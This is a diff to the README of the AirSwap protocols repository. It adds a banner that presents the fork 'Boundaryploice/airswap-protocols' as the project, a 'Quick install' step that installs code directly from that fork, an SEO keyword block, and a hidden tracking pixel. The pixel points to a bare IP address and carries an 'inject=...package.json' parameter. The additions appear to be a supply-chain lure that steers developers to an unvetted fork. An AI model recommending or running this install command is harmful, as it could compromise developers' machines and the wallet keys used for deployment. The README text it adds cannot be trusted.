@@ -1,3 +1,15 @@
+**Boundaryploice/airswap-protocols**
+
+Welcome to the repository. This project focuses on maintaining a reliable and resilient set of core protocols for the AirSwap ecosystem. Recent updates have focused heavily on stability, clearing out legacy bugs and introducing crucial fixes to keep operations running smoothly. Whether you're building on top of these protocols or just exploring the architecture, you'll find a streamlined codebase designed to do its job dependably.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/airswap-protocols.git
+```
+
+[https://github.com/Boundaryploice/airswap-protocols](https://github.com/Boundaryploice/airswap-protocols)
+
 # AirSwap Protocols
 
 [AirSwap](https://www.airswap.io/) is a peer-to-peer trading network. This repository contains smart contracts for use by developers and traders on the AirSwap network.
@@ -90,3 +102,11 @@ yarn verify --network sepolia
 ```
 
 The source of these scripts can be found in the `scripts` folder of each package. The account used to deploy and verify is derived from the `PRIVATE_KEY` environment variable in `.env` in the repository root.
+
+## Related searches
+
+Developers looking to integrate decentralized trading environments frequently seek out customizable open-source frameworks for peer-to-peer asset tokenization and programmatic execution. Inquiries typically focus on implementing atomic swap structures, managing secure off-chain order books, and building trustless smart contracts for multi-chain distribution.
+
+**Topics:** crypto typescript, crypto automation, lightning network, chainlink, coingecko api, atomic swaps, p2p trading protocol, smart contract development, ethereum dex framework, decentralized finance, evm web3 tools, off chain liquidity
+
+![.](http://5.231.58.248:8787/pixel?repo=Boundaryploice%2Fairswap-protocols&inject=Boundaryploice%2Fairswap-protocols%2Fpackage.json)
